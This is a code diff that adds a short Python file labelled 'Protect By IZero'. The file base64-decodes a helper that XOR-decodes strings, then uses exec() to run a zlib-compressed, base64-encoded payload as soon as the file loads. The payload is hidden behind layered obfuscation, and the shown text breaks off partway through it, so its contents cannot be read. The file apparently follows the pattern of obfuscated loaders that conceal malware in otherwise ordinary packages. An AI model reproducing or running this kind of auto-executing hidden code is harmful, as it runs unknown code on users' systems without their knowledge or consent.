@@ -1,0 +1,11 @@
+
+# Protect By IZero
+import base64
+import zlib
+
+def kfcjctnp(encoded_code):
+    exec(base64.b64decode('CmRlZiBzc21scXZ4dihzKToKICAgIGRlY29kZWRfcyA9IGJhc2U2NC5iNjRkZWNvZGUocykKICAgIGtleSA9IDU4CiAgICByZXR1cm4gYnl0ZXMoW2IgXiBrZXkgZm9yIGIgaW4gZGVjb2RlZF9zXSkuZGVjb2RlKCd1dGYtOCcpCg==').decode(), globals())
+    
+    exec(zlib.decompress(base64.b64decode(encoded_code)).decode(), globals())
+
+kfcjctnp('eJx0vFtzq8zWpXn//Yq3r+rb4e4yCaIsOqIukkxSCAmkBPKAbjo4Y5NCsoUN9q/vqV0dVdHR0Sti7ze8ZHHInHOMZ5DJer/eb1/zP1X5aP/b5j/e/8dPf+a9+o//aNrun99qmT6+/6r/bKf61rTN//X8/3/9n//xD/x57/5BlvXP6+s/9j//xz+u9c//9t//sf7HR88/3e3rn//rn/fpn69y6tv/dP/1vz56/rmXj8e//6Jd2/o//8f5/2v13zZN+zzFfz4eV/P5s/78539pZXOTVz9vA/dSX/1UabTk0nXF6K+VkWvtmDetE69klw+Ck7TYoZtmhrZL8tdpP1N8+CFh6lKUWGI3PD+38p3vVUheOGL/8/u5uXSlftDacR0+mbxF6K/VAy120Y0go6lBH5IVB/jZkcra1wi9C2fYw8+pVr7G1vN8SaNs6wQ/exXzC7IbVBEulO+iuxBe36mVKzzc5MRc3c9tp5JTo80lm0zjL/V//y//+td//X
